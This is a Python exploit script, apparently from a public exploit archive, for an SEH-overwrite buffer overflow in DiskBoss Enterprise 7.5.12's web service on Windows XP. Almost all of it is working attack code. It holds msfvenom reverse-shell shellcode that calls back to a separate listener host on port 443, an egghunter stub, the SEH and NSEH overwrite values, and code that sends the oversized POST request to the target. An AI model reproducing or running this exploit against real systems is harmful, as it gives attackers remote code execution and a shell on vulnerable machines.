#!/usr/bin/python
 
# Exploit Title: DiskBoss Enterprise 7.5.12 SEH + Egghunter Buffer Overflow
# Date: 10-01-2017
# Exploit Author: Wyndell Bibera
# Software Link: http://www.diskboss.com/setups/diskbossent_setup_v7.5.12.exe
# Version: 7.5.12
# Tested on: Windows XP Professional SP3

import socket

ip = "192.168.37.131"
port = 80

# msfvenom -p windows/shell_reverse_tcp -b "\x00\x09\x0a\x0d\x20" LHOST=192.168.37.130 LPORT=443 -f c
# Payload size: 351 bytes
shellcode = (
"\x90\x90\x90\x90\x90\x90\x90\x90"
"\xda\xde\xd9\x74\x24\xf4\xbd\xc9\xdb\xbb\x38\x58\x33\xc9\xb1"
"\x52\x83\xe8\xfc\x31\x68\x13\x03\xa1\xc8\x59\xcd\xcd\x07\x1f"
"\x2e\x2d\xd8\x40\xa6\xc8\xe9\x40\xdc\x99\x5a\x71\x96\xcf\x56"
"\xfa\xfa\xfb\xed\x8e\xd2\x0c\x45\x24\x05\x23\x56\x15\x75\x22"
"\xd4\x64\xaa\x84\xe5\xa6\xbf\xc5\x22\xda\x32\x97\xfb\x90\xe1"
"\x07\x8f\xed\x39\xac\xc3\xe0\x39\x51\x93\x03\x6b\xc4\xaf\x5d"
"\xab\xe7\x7c\xd6\xe2\xff\x61\xd3\xbd\x74\x51\xaf\x3f\x5c\xab"
"\x50\x93\xa1\x03\xa3\xed\xe6\xa4\x5c\x98\x1e\xd7\xe1\x9b\xe5"
"\xa5\x3d\x29\xfd\x0e\xb5\x89\xd9\xaf\x1a\x4f\xaa\xbc\xd7\x1b"
"\xf4\xa0\xe6\xc8\x8f\xdd\x63\xef\x5f\x54\x37\xd4\x7b\x3c\xe3"
"\x75\xda\x98\x42\x89\x3c\x43\x3a\x2f\x37\x6e\x2f\x42\x1a\xe7"
"\x9c\x6f\xa4\xf7\x8a\xf8\xd7\xc5\x15\x53\x7f\x66\xdd\x7d\x78"
"\x89\xf4\x3a\x16\x74\xf7\x3a\x3f\xb3\xa3\x6a\x57\x12\xcc\xe0"
"\xa7\x9b\x19\xa6\xf7\x33\xf2\x07\xa7\xf3\xa2\xef\xad\xfb\x9d"
"\x10\xce\xd1\xb5\xbb\x35\xb2\x79\x93\x10\xc0\x12\xe6\x5a\xc5"
"\x59\x6f\xbc\xaf\x8d\x26\x17\x58\x37\x63\xe3\xf9\xb8\xb9\x8e"
"\x3a\x32\x4e\x6f\xf4\xb3\x3b\x63\x61\x34\x76\xd9\x24\x4b\xac"
"\x75\xaa\xde\x2b\x85\xa5\xc2\xe3\xd2\xe2\x35\xfa\xb6\x1e\x6f"
"\x54\xa4\xe2\xe9\x9f\x6c\x39\xca\x1e\x6d\xcc\x76\x05\x7d\x08"
"\x76\x01\x29\xc4\x21\xdf\x87\xa2\x9b\x91\x71\x7d\x77\x78\x15"
"\xf8\xbb\xbb\x63\x05\x96\x4d\x8b\xb4\x4f\x08\xb4\x79\x18\x9c"
"\xcd\x67\xb8\x63\x04\x2c\xc8\x29\x04\x05\x41\xf4\xdd\x17\x0c"
"\x07\x08\x5b\x29\x84\xb8\x24\xce\x94\xc9\x21\x8a\x12\x22\x58"
"\x83\xf6\x44\xcf\xa4\xd2"
)

# 1002A66B POP POP POP RETN
seh = "\x6b\xa6\x02\x10"
nseh = "\xEB\x06\x90\x90"

egg = "DAMCDAMC"

egghunter = (
"\x90\x90\x90\x90"
"\x66\x81\xca\xff"
"\x0f\x42\x52\x6a"
"\x02\x58\xcd\x2e"
"\x3c\x05\x5a\x74"
"\xef\xb8\x44\x41"
"\x4d\x43\x8b\xfa"
"\xaf\x75\xea\xaf"
"\x75\xe7\xff\xe7"
)

seh_offset = "A"*(2492 - len(nseh) - len(egg) - len(shellcode))

buffer = egg + shellcode + seh_offset + nseh + seh + egghunter + "A"*(5000 - len(seh_offset) - len(seh) - len(nseh) - len(egg) - len(egghunter) - len(shellcode))

request = (
"POST " + buffer + " HTTP/1.1\r\n"
"Host: :192.168.37.131\r\n"
"User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; he; rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12\r\n"
"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*    ;q=0.8\r\n\r\n")
 
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip, port))
s.send(request)
s.close()
